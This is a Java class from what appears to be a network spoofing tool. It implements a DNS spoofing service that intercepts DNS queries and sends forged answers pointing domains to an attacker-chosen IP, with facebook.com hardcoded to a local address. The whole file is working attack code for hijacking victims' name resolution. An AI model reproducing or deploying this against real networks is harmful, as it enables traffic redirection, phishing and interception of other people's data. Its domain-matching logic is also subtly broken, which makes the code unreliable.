package org.bitducks.spoofing.services;

import java.io.UnsupportedEncodingException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

import jpcap.packet.Packet;
import jpcap.packet.UDPPacket;

import org.bitducks.spoofing.core.Server;
import org.bitducks.spoofing.core.Service;
import org.bitducks.spoofing.core.rules.DNSIpv4Rule;
import org.bitducks.spoofing.packet.DNSPacket;
import org.bitducks.spoofing.packet.PacketFactory;

import com.sun.xml.internal.bind.v2.runtime.unmarshaller.XsiNilLoader.Array;

public class DNSService extends Service {
	private InetAddress falseDefaultIpAddr = null;
	private Map<String, InetAddress> dnsPacketFilter = new HashMap<String, InetAddress>();
	
	public DNSService() {
		
		// TODO Add rule
		this.getPolicy().addRule(new DNSIpv4Rule());
		
		this.getPolicy().setStrict(true);
		try {
			this.addDnsPacketFilter("facebook.com", InetAddress.getByName("10.17.62.11"));
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		// TODO Get our IP or the IP provided
		//this.setDNSFalseIp("10.17.62.145");
	}
	
	public void setDNSFalseIp(String falseHostIp) {
		try {
			this.falseDefaultIpAddr = InetAddress.getByName(falseHostIp);
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}		
	}
	
	public void addDnsPacketFilter(String regex, InetAddress addr) {
		this.dnsPacketFilter.put(regex, addr);
	}
	
	public void removeDnsPacketFilter(String regex) {
		this.dnsPacketFilter.remove(regex);
	}
	
	/**
	 *  the newRegex and addr field must be filled with old value if not changed
	 * @param oldRegex
	 * @param newRegex
	 * @param addr
	 */
	public void editDnsPacketFilter(String oldRegex, String newRegex, InetAddress addr) {
		this.dnsPacketFilter.remove(oldRegex);
		this.dnsPacketFilter.put(newRegex, addr);
	}

	@Override
	public void run() {
		
		System.out.println("DNS Starting");
		UDPPacket queryPaquet = null;
		while ((queryPaquet = (UDPPacket)this.getNextPacket()) != null) {
			
			InetAddress falseIpAddr = null;
			if ((falseIpAddr = this.isDNSPacketMatchingWithFilter(queryPaquet)) != null) {
				
				// Getting the query part of the packet
				byte[] queryData = queryPaquet.data;
				
				ByteBuffer queryBuffer = ByteBuffer.allocate(queryData.length - 12);
				for (int i = 12; i < queryData.length; ++i) {
					queryBuffer.put(queryData[i]);
				}
				
				
				DNSPacket answerPaquet = PacketFactory.dnsRequest(queryPaquet,
						new byte[] { queryData[0], queryData[1] },   // Transaction
						new byte[] { queryData[4], queryData[5] }, // Question
						queryBuffer.array(), 
						falseIpAddr);
				
				this.sendDNSPacket(answerPaquet);
			}
				
		}
	}
	
	/**
	 * 
	 * @param p
	 * @return 	InetAddress		The false Ip address to send in the packet, 
	 * 			NULL 			If the list contain something and is not matching with the packet
	 * 			DefaultFalseIp  If the list is empty.
	 */
	public InetAddress isDNSPacketMatchingWithFilter(Packet p) {
		// If empty
		if (this.dnsPacketFilter.isEmpty()) {
			return this.falseDefaultIpAddr;
		}
		
		StringBuilder builder = new StringBuilder();
		for (int i = 0; i < p.data.length; ++i) {
			//System.out.println(p.data[i]);
			builder.append(p.data[i] & 0xff);
		}
		
		
		// TODO Convert byte to ascii .. DAM JAVA

		
		String data = builder.toString();
		
		
		Iterator<String> it = this.dnsPacketFilter.keySet().iterator();
		// Checking all the filter
		while (it.hasNext()) {
			String regex = it.next();
			if (data.matches(regex)) {
				return this.dnsPacketFilter.get(regex);
			}
		}
		
		return null;  // When none of the filter are matching
	}
	
	private void sendDNSPacket(DNSPacket packet) {
		Server.getInstance().sendPacket(packet);
	}

}
